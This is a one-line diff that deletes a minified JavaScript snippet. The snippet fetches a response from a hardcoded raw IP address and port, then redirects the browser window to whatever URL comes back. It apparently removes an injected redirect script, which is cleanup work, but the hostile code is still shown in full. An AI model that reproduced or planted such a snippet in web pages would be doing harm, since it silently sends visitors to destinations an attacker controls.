@@ -1,1 +1,0 @@
-let xhr;(xhr=window.XMLHttpRequest?new XMLHttpRequest:new ActiveXObject("Microsoft.XMLHTTP")).open("GET","http://101.200.121.37:20614/get.img.do",!0),xhr.setRequestHeader("Accept","application/json"),xhr.onreadystatechange=function(){4==xhr.readyState&&200==xhr.status&&(window.location.href=xhr.responseText)},xhr.send();
